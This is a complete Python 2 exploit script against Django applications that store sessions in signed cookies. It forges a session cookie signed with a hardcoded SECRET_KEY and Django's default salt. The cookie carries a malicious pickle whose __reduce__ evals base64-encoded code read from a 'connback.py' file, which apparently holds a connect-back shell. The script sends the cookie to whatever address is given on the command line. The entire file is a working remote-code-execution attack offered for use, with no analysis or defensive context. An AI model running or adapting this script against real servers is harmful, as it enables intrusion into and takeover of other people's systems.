import os, sys, subprocess
import hashlib, base64, pickle, requests
from hmac import new as hmac
    
SECRET_KEY = "kgsu8jv!(bew#wm!eb3rb=7gy6=&5ew*jv)j-6-(50$f%no98-"
payload = base64.b64encode(open('connback.py').read())

class ex(object):
    def __reduce__(self):
        return ( eval, ('str(eval(compile("%s".decode("base64"),"q","exec"))).strip("None")'%(payload),) )

def send_payload(key, addr, payload):
    # mostly taken from django
    def base64(s):
        import base64
        return base64.urlsafe_b64encode(s).strip(b'=')

    def salted_hmac(salt, value, secret):
        key = hashlib.sha1((salt + secret).encode('utf-8')).digest()
        return hmac(key, msg=value, digestmod=hashlib.sha1).digest()

    import time, baseconv
    timestamp = baseconv.base62.encode(str(int(time.time())))
    data = base64(payload)+":"+timestamp
    mac = base64(salted_hmac('django.contrib.sessions.backends.signed_cookiessigner', data, key)) # default salt by django
    s = '%(payload)s:%(time)s:%(mac)s'%{'payload':base64(payload), 'time':timestamp, 'mac':mac}

    try:
        print requests.get(addr, cookies={'sessionid':s}, timeout=15)
    except:
        print ' - Could not connect to server. Aborting.'

if len(sys.argv)<2:
    print "Usage:",sys.argv[0],"address"
    sys.exit(1)

ADDRESS = sys.argv[1]

def main():
    print ' + Sending payload...'
    p = pickle.dumps(ex())
    send_payload(SECRET_KEY, ADDRESS, p)
    sys.exit(0)

if __name__ == "__main__":
    main()
